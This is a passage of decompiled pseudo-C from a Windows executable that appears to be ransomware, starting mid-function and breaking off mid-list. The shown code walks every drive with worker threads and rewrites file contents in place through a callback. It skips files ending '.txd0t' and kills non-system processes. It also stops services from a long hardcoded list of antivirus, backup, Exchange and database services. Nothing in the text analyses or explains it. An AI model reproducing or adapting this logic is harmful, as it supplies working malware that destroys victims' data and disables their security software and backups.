  HANDLE v5; // eax
  int v6; // eax
  int v7; // eax
  HANDLE StdHandle; // eax
  void *v9; // edi
  HANDLE v10; // eax
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-Ch] BYREF
  DWORD dwErrCode; // [esp+10h] [ebp-8h]
  int v13; // [esp+14h] [ebp-4h]
  va_list va; // [esp+24h] [ebp+Ch] BYREF

  va_start(va, lpString);
  dwErrCode = GetLastError();
  v1 = 0;
  v2 = dwErrCode;
  v3 = lstrlenA(lpString);
  v13 = 0;
  while ( 1 )
  {
    v3 += 512;
    if ( v1 )
    {
      ProcessHeap = GetProcessHeap();
      HeapFree(ProcessHeap, 0, v1);
      v1 = 0;
    }
    if ( v3 > 0xA00000 )
      break;
    v5 = GetProcessHeap();
    v1 = HeapAlloc(v5, 8u, v3 + 129);
    if ( !v1 )
      break;
    v6 = wvnsprintfA((PSTR)v1, v3, lpString, va);
    v2 = v6;
    if ( v6 >= 0 && v6 < (int)(v3 - 1) )
    {
      v7 = v13;
      goto LABEL_9;
    }
  }
  v7 = 1;
LABEL_9:
  *((_BYTE *)v1 + v2) = 0;
  if ( !v7 )
  {
    StdHandle = GetStdHandle(0xFFFFFFF5);
    v9 = StdHandle;
    if ( StdHandle != (HANDLE)-1 )
    {
      WriteFile(StdHandle, v1, v2, &NumberOfBytesWritten, 0);
      FlushFileBuffers(v9);
    }
    v10 = GetProcessHeap();
    HeapFree(v10, 0, v1);
  }
  SetLastError(dwErrCode);
}

//----- (00401B00) --------------------------------------------------------
void __cdecl __noreturn sub_401B00(int a1)
{
  while ( 1 )
  {
    while ( WaitForSingleObject(*(HANDLE *)(dword_425F4C + 4 * a1), 0x3E8u) )
      ;
    dword_4289D8(*(_DWORD *)(dword_425F30 + 4 * a1), *(_DWORD *)(dword_425F28 + 4 * a1));
    SetEvent(lpHandles[a1]);
  }
}
// 425F28: using guessed type int dword_425F28;
// 425F30: using guessed type int dword_425F30;
// 425F4C: using guessed type int dword_425F4C;
// 4289D8: using guessed type int (__cdecl *dword_4289D8)(_DWORD, _DWORD);

//----- (00401B60) --------------------------------------------------------
int __thiscall sub_401B60(FILETIME *lpFileTime)
{
  int v1; // esi
  struct _SYSTEMTIME LocalTime; // [esp+8h] [ebp-20h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+18h] [ebp-10h] BYREF

  v1 = 1;
  if ( FileTimeToSystemTime(lpFileTime, &SystemTime)
    && SystemTimeToTzSpecificLocalTime(0, &SystemTime, &LocalTime)
    && (LocalTime.wYear == dword_424864 || LocalTime.wYear == dword_424864 - 1) )
  {
    return 0;
  }
  return v1;
}
// 424864: using guessed type int dword_424864;

//----- (00401BB0) --------------------------------------------------------
ULONG __stdcall sub_401BB0(const unsigned __int16 *Parameter)
{
  unsigned int v1; // eax
  int v2; // esi
  HANDLE ProcessHeap; // eax
  WCHAR *v4; // eax
  WCHAR *v5; // ebx
  LPWSTR ExtensionW; // eax
  DWORD v7; // eax
  int v8; // edi
  HANDLE v9; // eax
  SIZE_T v11; // [esp-4h] [ebp-2A4h]
  HANDLE hFindFile; // [esp+Ch] [ebp-294h]
  struct _SYSTEMTIME LocalTime; // [esp+10h] [ebp-290h] BYREF
  SYSTEMTIME UniversalTime; // [esp+20h] [ebp-280h] BYREF
  struct _SYSTEMTIME v15; // [esp+30h] [ebp-270h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+40h] [ebp-260h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+50h] [ebp-250h] BYREF

  if ( Parameter )
  {
    v1 = wcslen(Parameter);
    v2 = 2 * v1 + 1026;
    v11 = 2 * v1 + 1154;
    ProcessHeap = GetProcessHeap();
    v4 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, v11);
    v5 = v4;
    if ( v4 )
    {
      StrCpyNW(v4, Parameter, v2);
      StrNCatW(v5, L"\\*", v2);
      hFindFile = FindFirstFileW(v5, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
      {
        if ( GetLastError() != 5 )
          GetLastError();
      }
      else
      {
        do
        {
          if ( StrCmpW(FindFileData.cFileName, L".")
            && StrCmpW(FindFileData.cFileName, L"..")
            && (FindFileData.dwFileAttributes & 4) == 0 )
          {
            StrCpyNW(v5, Parameter, v2);
            StrNCatW(v5, L"\\", v2);
            StrNCatW(v5, FindFileData.cFileName, v2);
            if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
            {
              if ( !sub_401940(v5) )
                sub_401BB0(v5);
            }
            else
            {
              ExtensionW = PathFindExtensionW(FindFileData.cFileName);
              if ( ExtensionW && *ExtensionW && !StrCmpW(ExtensionW, L".txd0t") )
              {
                ++dword_4289E4;
              }
              else if ( !sub_401870(FindFileData.cFileName)
                     && (!dword_4289E0
                      || FileTimeToSystemTime(&FindFileData.ftCreationTime, &SystemTime)
                      && SystemTimeToTzSpecificLocalTime(0, &SystemTime, &LocalTime)
                      && (LocalTime.wYear == dword_424864 || LocalTime.wYear == dword_424864 - 1)
                      || FileTimeToSystemTime(&FindFileData.ftLastAccessTime, &UniversalTime)
                      && SystemTimeToTzSpecificLocalTime(0, &UniversalTime, &v15)
                      && (v15.wYear == dword_424864 || v15.wYear == dword_424864 - 1)
                      || !sub_401B60(&FindFileData.ftLastWriteTime))
                     && *(_QWORD *)&FindFileData.nFileSizeHigh )
              {
                EnterCriticalSection(&CriticalSection);
                v7 = WaitForMultipleObjects(nCount, lpHandles, 0, 0xFFFFFFFF);
                if ( v7 != -1 )
                {
                  if ( *(_BYTE *)v5 != 92 || *((_BYTE *)v5 + 1) )
                  {
                    v8 = 4 * v7;
                    StrCpyW(*(PWSTR *)(4 * v7 + dword_425F30), L"\\\\?\\");
                    StrNCatW(*(PWSTR *)(v8 + dword_425F30), v5, 32000);
                  }
                  else
                  {
                    v8 = 4 * v7;
                    StrCpyW(*(PWSTR *)(4 * v7 + dword_425F30), v5);
                  }
                  SetEvent(*(HANDLE *)(v8 + dword_425F4C));
                }
                LeaveCriticalSection(&CriticalSection);
              }
            }
          }
        }
        while ( FindNextFileW(hFindFile, &FindFileData) );
        FindClose(hFindFile);
      }
      v9 = GetProcessHeap();
      HeapFree(v9, 0, v5);
    }
  }
  return 0;
}
// 424864: using guessed type int dword_424864;
// 425F30: using guessed type int dword_425F30;
// 425F4C: using guessed type int dword_425F4C;
// 4289E0: using guessed type int dword_4289E0;
// 4289E4: using guessed type int dword_4289E4;

//----- (00401E90) --------------------------------------------------------
int sub_401E90()
{
  DWORD_PTR v0; // esi
  HANDLE ProcessHeap; // eax
  LPVOID (__stdcall *v2)(HANDLE, DWORD, SIZE_T); // edi
  HANDLE v3; // eax
  HANDLE v4; // eax
  HANDLE v5; // eax
  HANDLE EventA; // eax
  HANDLE v8; // eax
  HANDLE v9; // eax
  LPVOID v10; // eax
  HANDLE v11; // eax
  LPVOID v12; // eax
  void *v13; // edi
  HANDLE CurrentThread; // eax
  SIZE_T v15; // [esp-4h] [ebp-34h]
  SIZE_T v16; // [esp-4h] [ebp-34h]
  SIZE_T v17; // [esp-4h] [ebp-34h]
  SIZE_T v18; // [esp-4h] [ebp-34h]
  int v19; // [esp-4h] [ebp-34h]
  struct _SYSTEM_INFO SystemInfo; // [esp+Ch] [ebp-24h] BYREF

  v0 = 0;
  if ( !InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x1F4u) )
    return v0;
  GetSystemInfo(&SystemInfo);
  nCount = SystemInfo.dwNumberOfProcessors;
  v15 = 4 * SystemInfo.dwNumberOfProcessors + 128;
  ProcessHeap = GetProcessHeap();
  v2 = HeapAlloc;
  lpHandles = (HANDLE *)HeapAlloc(ProcessHeap, 8u, v15);
  if ( !lpHandles )
    return v0;
  v16 = 4 * nCount + 128;
  v3 = GetProcessHeap();
  dword_425F4C = (int)HeapAlloc(v3, 8u, v16);
  if ( !dword_425F4C )
    return v0;
  v17 = 4 * nCount + 128;
  v4 = GetProcessHeap();
  dword_425F30 = (int)HeapAlloc(v4, 8u, v17);
  if ( !dword_425F30 )
    return v0;
  v18 = 4 * nCount + 128;
  v5 = GetProcessHeap();
  dword_425F28 = (int)HeapAlloc(v5, 8u, v18);
  if ( !dword_425F28 )
    return v0;
  if ( (int)nCount <= 0 )
    return 1;
  while ( 1 )
  {
    EventA = CreateEventA(0, 0, 1, 0);
    lpHandles[v0] = EventA;
    if ( !EventA )
      break;
    v8 = CreateEventA(0, 0, 0, 0);
    *(_DWORD *)(dword_425F4C + 4 * v0) = v8;
    if ( !v8 )
      break;
    v9 = GetProcessHeap();
    v10 = v2(v9, 8u, 0x7D80u);
    *(_DWORD *)(dword_425F30 + 4 * v0) = v10;
    if ( !v10 )
      break;
    v19 = sub_402230() + 128;
    v11 = GetProcessHeap();
    v12 = v2(v11, 8u, v19);
    *(_DWORD *)(dword_425F28 + 4 * v0) = v12;
    if ( !v12 )
      break;
    v13 = (void *)sub_404C10((ULONG (__stdcall *)(PVOID))sub_401B00, (void *)v0, 0);
    if ( v13 )
    {
      CurrentThread = GetCurrentThread();
      SetThreadAffinityMask(CurrentThread, v0);
      SetThreadPriorityBoost(v13, 0);
      CloseHandle(v13);
    }
    if ( (int)++v0 >= (int)nCount )
      return 1;
    v2 = HeapAlloc;
  }
  return 0;
}
// 425F28: using guessed type int dword_425F28;
// 425F30: using guessed type int dword_425F30;
// 425F4C: using guessed type int dword_425F4C;

//----- (00402040) --------------------------------------------------------
int (__cdecl *sub_402040())(unsigned __int16 *psz2, void *a2)
{
  int (__cdecl *result)(unsigned __int16 *, void *); // eax
  unsigned int i; // eax
  WCHAR *v2; // esi
  HANDLE j; // eax
  DWORD v4; // ecx
  unsigned int v5; // eax
  bool v6; // zf
  int *v7; // eax
  void *v8; // esi
  HANDLE k; // eax
  DWORD v10; // ecx
  void *v11; // [esp-18h] [ebp-434h]
  HANDLE Handles; // [esp+0h] [ebp-41Ch] BYREF
  char v13[1036]; // [esp+4h] [ebp-418h] BYREF
  int v14; // [esp+410h] [ebp-Ch]
  DWORD nCount; // [esp+414h] [ebp-8h]
  DWORD ThreadId; // [esp+418h] [ebp-4h] BYREF

  result = sub_4032F0;
  if ( sub_4032F0 )
  {
    dword_4289D8 = (int (__cdecl *)(_DWORD, _DWORD))sub_4032F0;
    Handles = 0;
    sub_413EB0((int)v13, 0, 0x40Cu);
    nCount = 0;
    result = (int (__cdecl *)(unsigned __int16 *, void *))GetLogicalDriveStringsW(0x104u, &Parameter);
    if ( result )
    {
      for ( i = 0; i < 0x208; i += 2 )
      {
        if ( *(WCHAR *)((char *)&Parameter + i) == 92 )
          *(WCHAR *)((char *)&Parameter + i) = 0;
      }
      v2 = &Parameter;
      if ( Parameter )
      {
        do
        {
          ThreadId = 0;
          for ( j = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401BB0, v2, 0, &ThreadId);
                !j;
                j = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401BB0, v2, 0, &ThreadId) )
          {
            Sleep(0x3E8u);
          }
          v4 = nCount;
          *(_DWORD *)&v13[4 * nCount - 4] = j;
          nCount = v4 + 1;
          v5 = wcslen(v2);
          v6 = v2[v5 + 2] == 0;
          v2 += v5 + 2;
        }
        while ( !v6 );
      }
      sub_403F20(0);
      v14 = 0;
      if ( dword_428C00[0] )
      {
        v7 = dword_428C00;
        do
        {
          v8 = (void *)*v7;
          v11 = (void *)*v7;
          ThreadId = 0;
          for ( k = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401BB0, v11, 0, &ThreadId);
                !k;
                k = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401BB0, v8, 0, &ThreadId) )
          {
            Sleep(0x3E8u);
          }
          v10 = nCount;
          *(_DWORD *)&v13[4 * nCount - 4] = k;
          v6 = dword_428C00[++v14] == 0;
          v7 = &dword_428C00[v14];
          nCount = v10 + 1;
        }
        while ( !v6 );
      }
      return (int (__cdecl *)(unsigned __int16 *, void *))WaitForMultipleObjects(nCount, &Handles, 1, 0xFFFFFFFF);
    }
  }
  return result;
}
// 4289D8: using guessed type int (__cdecl *dword_4289D8)(_DWORD, _DWORD);
// 428C00: using guessed type int dword_428C00[1024];
// 402040: using guessed type char var_418[1036];

//----- (004021E0) --------------------------------------------------------
int sub_4021E0()
{
  unsigned int v0; // ecx
  unsigned int v1; // esi
  int v2; // edi
  __int64 v3; // rax

  v0 = HIDWORD(qword_424C08[0]);
  v1 = qword_424C08[0];
  v2 = 0;
  v3 = qword_424C08[0];
  if ( qword_424C08[0] )
  {
    do
    {
      if ( v3 >= __SPAIR64__(v0, v1) )
        v3 = __PAIR64__(v0, v1);
      ++v2;
      v1 = qword_424C08[4 * v2];
      v0 = HIDWORD(qword_424C08[4 * v2]);
    }
    while ( v0 | v1 );
  }
  return v3;
}
// 424C08: using guessed type __int64 qword_424C08[];

//----- (00402230) --------------------------------------------------------
int sub_402230()
{
  unsigned int v0; // ecx
  unsigned int v1; // esi
  int v2; // edi
  __int64 v3; // rax

  v0 = HIDWORD(qword_424C08[0]);
  v1 = qword_424C08[0];
  v2 = 0;
  v3 = qword_424C08[0];
  if ( qword_424C08[0] )
  {
    do
    {
      if ( v3 <= __SPAIR64__(v0, v1) )
        v3 = __PAIR64__(v0, v1);
      ++v2;
      v1 = qword_424C08[4 * v2];
      v0 = HIDWORD(qword_424C08[4 * v2]);
    }
    while ( v0 | v1 );
  }
  return v3;
}
// 424C08: using guessed type __int64 qword_424C08[];

//----- (00402280) --------------------------------------------------------
int *__cdecl sub_402280(__int64 a1)
{
  int v1; // eax
  int v2; // ecx

  v1 = 0;
  if ( !qword_424C08[0] )
    return 0;
  v2 = 0;
  while ( a1 < __SPAIR64__(dword_424BFC[v2], dword_424BF8[v2]) || a1 >= __SPAIR64__(dword_424C04[v2], dword_424C00[v2]) )
  {
    ++v1;
    v2 = 8 * v1;
    if ( !(HIDWORD(qword_424C08[4 * v1]) | LODWORD(qword_424C08[4 * v1])) )
      return 0;
  }
  return &dword_424BF8[8 * v1];
}
// 424BF8: using guessed type int dword_424BF8[];
// 424BFC: using guessed type int dword_424BFC[];
// 424C00: using guessed type int dword_424C00[];
// 424C04: using guessed type int dword_424C04[];
// 424C08: using guessed type __int64 qword_424C08[];

//----- (004022F0) --------------------------------------------------------
int __usercall sub_4022F0@<eax>(
        void *a1@<ebx>,
        int a2,
        void *lpBuffer,
        signed __int64 a4,
        void (__cdecl *a5)(int, void *, DWORD))
{
  int *v5; // eax
  int *v6; // esi
  __int64 v7; // rax
  int v8; // edx
  int v9; // eax
  __int64 v10; // rdi
  signed __int64 v11; // rax
  LARGE_INTEGER v13; // [esp-10h] [ebp-40h]
  int v14; // [esp+Ch] [ebp-24h]
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-20h] BYREF
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-1Ch] BYREF
  DWORD v17; // [esp+18h] [ebp-18h]
  LARGE_INTEGER *v18; // [esp+1Ch] [ebp-14h]
  __int64 v19; // [esp+20h] [ebp-10h]
  unsigned __int64 nNumberOfBytesToRead; // [esp+28h] [ebp-8h]

  v5 = sub_402280(a4);
  v6 = v5;
  v18 = (LARGE_INTEGER *)v5;
  if ( !v5 )
    return 0;
  if ( a4 >= *((_QWORD *)v5 + 3) )
  {
    LODWORD(v7) = sub_4184E0(a4, *((_QWORD *)v5 + 3));
    v19 = v7;
    if ( v7 )
      goto LABEL_5;
    return 0;
  }
  v19 = 1i64;
LABEL_5:
  NumberOfBytesRead = 0;
  v8 = v6[4];
  v9 = v6[5];
  v10 = 0i64;
  nNumberOfBytesToRead = __PAIR64__(v9, v8);
  v14 = 1;
  if ( v19 > 0 )
  {
    while ( 1 )
    {
      if ( v19 == 1 && !v10 )
      {
        LODWORD(v11) = sub_4021E0();
        if ( a4 < v11 )
          nNumberOfBytesToRead = a4 - sub_418620(a4, 16i64);
      }
      if ( !ReadFile(a1, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
        break;
      a5(a2, lpBuffer, NumberOfBytesRead);
      v13.HighPart = -(NumberOfBytesRead != 0);
      v13.LowPart = -NumberOfBytesRead;
      if ( !SetFilePointerEx(a1, v13, 0, 1u) )
        break;
      v17 = NumberOfBytesRead;
      NumberOfBytesWritten = 0;
      if ( !lpBuffer
        || !NumberOfBytesRead
        || !a1
        || !WriteFile(a1, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0)
        || v17 != NumberOfBytesWritten )
      {
        break;
      }
      FlushFileBuffers(a1);
      if ( ++v10 != v19 )
      {
        if ( !SetFilePointerEx(a1, v18[3], 0, 1u) )
          return 0;
        if ( SHIDWORD(v10) > SHIDWORD(v19) )
          return v14;
        if ( SHIDWORD(v10) < SHIDWORD(v19) )
          continue;
      }
      if ( (unsigned int)v10 >= (unsigned int)v19 )
        return v14;
    }
    return 0;
  }
  return v14;
}
// 402348: variable 'v7' is possibly undefined
// 4023B5: variable 'v11' is possibly undefined

//----- (004024D0) --------------------------------------------------------
HANDLE __cdecl sub_4024D0(DWORD dwProcessId)
{
  HANDLE result; // eax
  void *v2; // ebx
  PCWSTR *v3; // esi
  DWORD TickCount; // eax
  WCHAR pszFirst[260]; // [esp+4h] [ebp-210h] BYREF
  ULONG ReturnLength; // [esp+20Ch] [ebp-8h] BYREF
  int ProcessInformation; // [esp+210h] [ebp-4h] BYREF

  result = OpenProcess(0x10043Au, 0, dwProcessId);
  v2 = result;
  if ( result )
  {
    if ( GetModuleFileNameExW(result, 0, pszFirst, 260) && !StrStrIW(pszFirst, aWindows) )
    {
      if ( off_424A70 )
      {
        v3 = &off_424A70;
        while ( !StrStrIW(pszFirst, off_424A70) )
        {
          if ( !*++v3 )
            goto LABEL_8;
        }
      }
      else
      {
LABEL_8:
        ProcessInformation = 0;
        ReturnLength = 0;
        if ( ZwQueryInformationProcess(v2, ProcessBreakOnTermination, &ProcessInformation, 4u, &ReturnLength) < 0
          || !ProcessInformation )
        {
          TickCount = GetTickCount();
          sub_4045C0(dwProcessId, TickCount);
        }
      }
    }
    return (HANDLE)CloseHandle(v2);
  }
  return result;
}
// 419218: using guessed type int __stdcall GetModuleFileNameExW(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004025B0) --------------------------------------------------------
ULONG __stdcall sub_4025B0(PVOID Parameter)
{
  HANDLE Toolhelp32Snapshot; // eax
  void *v2; // esi
  HANDLE CurrentProcess; // eax
  int v4; // eax
  PROCESSENTRY32W pe; // [esp+4h] [ebp-248h] BYREF
  char ProcessInformation[20]; // [esp+230h] [ebp-1Ch] BYREF
  int v8; // [esp+244h] [ebp-8h]
  ULONG ReturnLength; // [esp+248h] [ebp-4h] BYREF

  while ( dword_424860 )
  {
    pe.dwSize = 0;
    sub_413EB0((int)&pe.cntUsage, 0, 0x228u);
    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    v2 = Toolhelp32Snapshot;
    if ( Toolhelp32Snapshot == (HANDLE)-1 )
    {
      GetLastError();
    }
    else
    {
      pe.dwSize = 556;
      if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
      {
        do
        {
          if ( !dword_424860 )
            break;
          if ( pe.th32ProcessID != GetCurrentProcessId() )
          {
            ReturnLength = 0;
            CurrentProcess = GetCurrentProcess();
            if ( ZwQueryInformationProcess(
                   CurrentProcess,
                   ProcessBasicInformation,
                   ProcessInformation,
                   0x18u,
                   &ReturnLength) >= 0
              && ReturnLength == 24 )
            {
              v4 = v8;
            }
            else
            {
              v4 = -1;
            }
            if ( pe.th32ProcessID != v4 )
              sub_4024D0(pe.th32ProcessID);
          }
        }
        while ( Process32NextW(v2, &pe) );
      }
      CloseHandle(v2);
    }
    Sleep(0x3A98u);
  }
  return 0;
}
// 424860: using guessed type int dword_424860;
// 4025B0: using guessed type char ProcessInformation[20];

//----- (004026B0) --------------------------------------------------------
BOOL sub_4026B0()
{
  HANDLE i; // eax
  DWORD ThreadId; // [esp+4h] [ebp-4h] BYREF

  dword_424860 = 1;
  GetSystemWindowsDirectoryW(aWindows, 0x104u);
  ThreadId = 0;
  for ( i = CreateThread(0, 0, sub_4025B0, 0, 0, &ThreadId); !i; i = CreateThread(0, 0, sub_4025B0, 0, 0, &ThreadId) )
    Sleep(0x3E8u);
  return CloseHandle(i);
}
// 424860: using guessed type int dword_424860;

//----- (00402730) --------------------------------------------------------
SC_HANDLE __cdecl sub_402730(LPCWSTR lpServiceName)
{
  SC_HANDLE result; // eax
  SC_HANDLE v2; // ebx
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // esi
  DWORD v5; // edx
  struct _SERVICE_STATUS Buffer; // [esp+4h] [ebp-30h] BYREF
  SC_HANDLE v7; // [esp+28h] [ebp-Ch]
  DWORD TickCount; // [esp+2Ch] [ebp-8h]
  DWORD pcbBytesNeeded; // [esp+30h] [ebp-4h] BYREF

  TickCount = GetTickCount();
  result = OpenSCManagerA(0, 0, 0xF003Fu);
  v2 = result;
  v7 = result;
  if ( result )
  {
    v3 = OpenServiceW(result, lpServiceName, 0x2Cu);
    v4 = v3;
    if ( v3 )
    {
      if ( QueryServiceStatusEx(v3, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
        && Buffer.dwCurrentState != 1 )
      {
        if ( Buffer.dwCurrentState == 3 )
        {
          while ( 1 )
          {
            v5 = Buffer.dwWaitHint / 0xA;
            if ( Buffer.dwWaitHint / 0xA >= 0x3E8 )
            {
              if ( v5 > 0x2710 )
                v5 = 10000;
            }
            else
            {
              v5 = 1000;
            }
            Sleep(v5);
            if ( !QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
              || Buffer.dwCurrentState == 1
              || GetTickCount() - TickCount > 0x7530 )
            {
              break;
            }
            if ( Buffer.dwCurrentState != 3 )
              goto LABEL_15;
          }
        }
        else
        {
LABEL_15:
          if ( ControlService(v4, 1u, &Buffer) && Buffer.dwCurrentState != 1 )
          {
            do
              Sleep(Buffer.dwWaitHint);
            while ( QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
                 && Buffer.dwCurrentState != 1
                 && GetTickCount() - TickCount <= 0x7530
                 && Buffer.dwCurrentState != 1 );
          }
        }
        v2 = v7;
      }
      CloseServiceHandle(v4);
      return (SC_HANDLE)CloseServiceHandle(v2);
    }
    else
    {
      return (SC_HANDLE)CloseServiceHandle(v2);
    }
  }
  return result;
}

//----- (00402890) --------------------------------------------------------
const WCHAR *sub_402890()
{
  const WCHAR *result; // eax
  int v1; // esi
  int v2[204]; // [esp+8h] [ebp-330h]

  result = L"ARSM";
  v2[0] = (int)L"AVP";
  v2[1] = (int)L"AcrSch2Svc";
  v2[2] = (int)L"Acronis VSS Provider";
  v2[3] = (int)L"AcronisAgent";
  v2[4] = (int)L"AcronixAgent";
  v2[5] = (int)L"Antivirus";
  v2[6] = (int)L"BackupExecAgentAccelerator";
  v2[7] = (int)L"BackupExecAgentBrowser";
  v2[8] = (int)L"BackupExecDeviceMediaService";
  v2[9] = (int)L"BackupExecJobEngine";
  v2[10] = (int)L"BackupExecManagementService";
  v2[11] = (int)L"BackupExecRPCService";
  v2[12] = (int)L"BackupExecVSSProvider";
  v2[13] = (int)L"DCAgent";
  v2[14] = (int)L"DbxSvc";
  v2[15] = (int)L"EPSecurityService";
  v2[16] = (int)L"EPUpdateService";
  v2[17] = (int)L"ESHASRV";
  v2[18] = (int)L"EhttpSrv";
  v2[19] = (int)L"Enterprise Client Service";
  v2[20] = (int)L"EraserSvc11710";
  v2[21] = (int)L"EsgShKernel";
  v2[22] = (int)L"FA_Scheduler";
  v2[23] = (int)L"IISAdmin";
  v2[24] = (int)L"IMAP4Svc";
  v2[25] = (int)L"KAVFS";
  v2[26] = (int)L"KAVFSGT";
  v2[27] = (int)&off_41C12C;
  v2[28] = (int)&off_41C144;
  v2[29] = (int)L"MMS";
  v2[30] = (int)L"MSExchangeAB";
  v2[31] = (int)L"MSExchangeADTopology";
  v2[32] = (int)L"MSExchangeAntispamUpdate";
  v2[33] = (int)L"MSExchangeES";
  v2[34] = (int)L"MSExchangeEdgeSync";
  v2[35] = (int)L"MSExchangeFBA";
  v2[36] = (int)L"MSExchangeFDS";
  v2[37] = (int)L"MSExchangeIS";
  v2[38] = (int)L"MSExchangeMGMT";
  v2[39] = (int)L"MSExchangeMTA";
  v2[40] = (int)L"MSExchangeMailSubmission";
  v2[41] = (int)L"MSExchangeMailboxAssistants";
  v2[42] = (int)L"MSExchangeMailboxReplication";
  v2[43] = (int)L"MSExchangeProtectedServiceHost";
  v2[44] = (int)L"MSExchangeRPC";
  v2[45] = (int)L"MSExchangeRepl";
  v2[46] = (int)L"MSExchangeSA";
  v2[47] = (int)L"MSExchangeSRS";
  v2[48] = (int)L"MSExchangeSearch";
  v2[49] = (int)L"MSExchangeServiceHost";
  v2[50] = (int)L"MSExchangeThrottling";
  v2[51] = (int)L"MSExchangeTransport";
  v2[52] = (int)L"MSExchangeTransportLogSearch";
  v2[53] = (int)L"MSOLAP$SQL_2008";
  v2[54] = (int)L"MSOLAP$SYSTEM_BGC";
  v2[55] = (int)L"MSOLAP$TPS";
  v2[56] = (int)L"MSOLAP$TPSAMA";
  v2[57] = (int)L"MSSQL$BKUPEXEC";
  v2[58] = (int)L"MSSQL$ECWDB2";
  v2[59] = (int)L"MSSQL$PRACTICEMGT";
  v2[60] = (int)L"MSSQL$PRACTTICEBGC";
  v2[61] = (int)L"MSSQL$PROD";
  v2[62] = (int)L"MSSQL$PROFXENGAGEMENT";
  v2[63] = (int)L"MSSQL$SBSMONITORING";
  v2[64] = (int)L"MSSQL$SHAREPOINT";
  v2[65] = (int)L"MSSQL$SOPHOS";
  v2[66] = (int)L"MSSQL$SQLEXPRESS";
  v2[67] = (int)L"MSSQL$SQL_2008";
  v2[68] = (int)L"MSSQL$SYSTEM_BGC";
  v2[69] = (int)L"MSSQL$TPS";
  v2[70] = (int)L"MSSQL$TPSAMA";
  v2[71] = (int)L"MSSQL$VEEAMSQL2008R2";
  v2[72] = (int)L"MSSQL$VEEAMSQL2012";
  v2[73] = (int)L"MSSQLFDLauncher";
  v2[74] = (int)L"MSSQLFDLauncher$PROFXENGAGEMENT";
  v2[75] = (int)L"MSSQLFDLauncher$SBSMONITORING";
  v2[76] = (int)L"MSSQLFDLauncher$SHAREPOINT";
  v2[77] = (int)L"MSSQLFDLauncher$SQL_2008";
  v2[78] = (int)L"MSSQLFDLauncher$SYSTEM_BGC";
  v2[79] = (int)L"MSSQLFDLauncher$TPS";
  v2[80] = (int)L"MSSQLFDLauncher$TPSAMA";
  v2[81] = (int)L"MSSQLSERVER";
  v2[82] = (int)L"MSSQLServerADHelper";
  v2[83] = (int)L"MSSQLServerADHelper100";
  v2[84] = (int)L"MSSQLServerOLAPService";
  v2[85] = (int)L"McAfeeEngineService";
  v2[86] = (int)L"McAfeeFramework";
  v2[87] = (int)L"McAfeeFrameworkMcAfeeFramework";
  v2[88] = (int)L"McShield";
  v2[89] = (int)L"McTaskManager";
  v2[90] = (int)L"MongoDB";
  v2[91] = (int)L"MsDtsServer";
  v2[92] = (int)L"MsDtsServer100";
  v2[93] = (int)L"MsDtsServer110";
  v2[94] = (int)L"MySQL57";
  v2[95] = (int)L"MySQL80";
  v2[96] = (int)L"nginx";
  v2[97] = (int)L"NetMsmqActivator";
  v2[98] = (int)L"OracleClientCache80";
  v2[99] = (int)L"OracleServiceXE";
  v2[100] = (int)L"OracleXETNSListener";
  v2[101] = (int)L"PDVFSService";
  v2[102] = (int)L"POP3Svc";
  v2[103] = (int)L"RESvc";
  v2[104] = (int)L"ReportServer";
  v2[105] = (int)L"ReportServer$SQL_2008";
  v2[106] = (int)L"ReportServer$SYSTEM_BGC";
  v2[107] = (int)L"ReportServer$TPS";
  v2[108] = (int)L"ReportServer$TPSAMA";
  v2[109] = (int)L"SAVAdminService";
  v2[110] = (int)L"SAVService";
  v2[111] = (int)L"SDRSVC";
  v2[112] = (int)L"SMTPSvc";
  v2[113] = (int)L"SNAC";
  v2[114] = (int)L"SQL Backups";
  v2[115] = (int)L"SQLAgent$BKUPEXEC";
  v2[116] = (int)L"SQLAgent$CITRIX_METAFRAME";
  v2[117] = (int)L"SQLAgent$CXDB";
  v2[118] = (int)L"SQLAgent$ECWDB2";
  v2[119] = (int)L"SQLAgent$PRACTTICEBGC";
  v2[120] = (int)L"SQLAgent$PRACTTICEMGT";
  v2[121] = (int)L"SQLAgent$PROD";
  v2[122] = (int)L"SQLAgent$PROFXENGAGEMENT";
  v2[123] = (int)L"SQLAgent$SBSMONITORING";
  v2[124] = (int)L"SQLAgent$SHAREPOINT";
  v2[125] = (int)L"SQLAgent$SOPHOS";
  v2[126] = (int)L"SQLAgent$SQLEXPRESS";
  v2[127] = (int)L"SQLAgent$SQL_2008";
  v2[128] = (int)L"SQLAgent$SYSTEM_BGC";
  v2[129] = (int)L"SQLAgent$TPS";
  v2[130] = (int)L"SQLAgent$TPSAMA";
  v2[131] = (int)L"SQLAgent$VEEAMSQL2008R2";
  v2[132] = (int)L"SQLAgent$VEEAMSQL2012";
  v2[133] = (int)L"SQLBrowser";
  v2[134] = (int)L"SQLSERVERAGENT";
  v2[135] = (int)L"SQLSafeOLRService";
  v2[136] = (int)L"SQLTELEMETRY";
  v2[137] = (int)L"SQLTELEMETRY$ECWDB2";
  v2[138] = (int)L"SQLWriter";
  v2[139] = (int)L"SQLsafe Backup Service";
  v2[140] = (int)L"SQLsafe Filter Service";
  v2[141] = (int)L"SamSs";
  v2[142] = (int)L"SepMasterService";
  v2[143] = (int)L"ShMonitor";
